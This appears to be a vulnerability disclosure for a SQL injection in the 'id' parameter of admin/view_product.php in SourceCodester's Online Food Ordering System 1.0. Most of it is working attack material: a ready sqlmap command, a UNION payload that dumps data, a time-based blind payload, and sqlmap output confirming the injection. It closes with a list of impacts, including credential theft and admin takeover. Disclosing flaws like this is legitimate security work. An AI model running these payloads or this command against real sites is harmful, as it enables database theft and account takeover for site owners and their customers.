# SQL Injection in Online Food Ordering System (Product View)

## Overview

* **Vulnerability Type**: SQL Injection
* **Vendor**: SourceCodester
* **Product**: [Online Food Ordering System](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
* **Version**: 1.0
* **Component**: Product View (`admin/view_product.php`)
* **Vulnerable Parameter**: `id` (GET)

## Description

A SQL Injection vulnerability exists in **Online Food Ordering System v1.0**. The vulnerability is located in the `admin/view_product.php` file, which is responsible for displaying product details.

The application fails to properly sanitize the `id` parameter in the HTTP GET request. This allows an authenticated attacker (or administrator) to inject arbitrary SQL commands. Since the backend is **SQLite** and the injection supports **UNION queries**, attackers can directly retrieve and display sensitive data from the database (such as administrator credentials) on the webpage, in addition to using blind injection techniques.

## Steps to Reproduce

1. **Setup**: Deploy the Online Food Ordering System locally.
2. **Login**: Log in to the application as an administrator.
3. **Tools**: Use `sqlmap` to automate the exploitation.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8088/admin/view_product.php?id=3" \
--referer="http://127.0.0.1:8088/admin/?page=products" \
--cookie="PHPSESSID=YOUR_COOKIE_HERE" \
--batch -v 6 --risk=3

```

## PoC Payload

**UNION Query Payload (High Impact):**

```sql
id=-1094' UNION ALL SELECT CHAR(113,112,106,98,113)||CHAR(67,75,77,82,82,78,104,90,84,113,99,111,100,104,107,117,115,80,85,121,122,105,78,90,81,102,99,70,67,68,74,99,98,66,119,72,97,109,122,90)||CHAR(113,120,98,112,113),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CTgJ

```

**Time-based Blind Payload:**

```sql
id=3' AND 8079=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'qROq'='qROq

```

## Proof of Concept

The following output from `sqlmap` confirms that the `id` parameter is vulnerable to UNION query injection (8 columns), as well as Boolean-based and Time-based blind injection.

```text
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=3' AND 1767=1767 AND 'CoFB'='CoFB
    Vector: AND [INFERENCE]

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: id=3' AND 8079=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'qROq'='qROq
    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: id=-1094' UNION ALL SELECT ... ,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CTgJ
    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
---
[INFO] the back-end DBMS is SQLite

```
<img width="1074" height="471" alt="图片" src="https://github.com/user-attachments/assets/38c3e2cb-c6e0-45c7-ba96-d4fd45172283" />
<img width="1095" height="471" alt="图片" src="https://github.com/user-attachments/assets/589b9053-66ce-44d7-9b05-12f9f47b3bbb" />


## Impact

This vulnerability allows an attacker to:

1. **Data Exfiltration**: Directly retrieve and display the entire database content (users, orders, products) via UNION-based attacks.
2. **Authentication Bypass**: Read admin credentials to take over the system.
3. **System Compromise**: Enumerate database schema and server information.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/14951/online-food-ordering-system-php-and-sqlite-database-free-source-code.html)
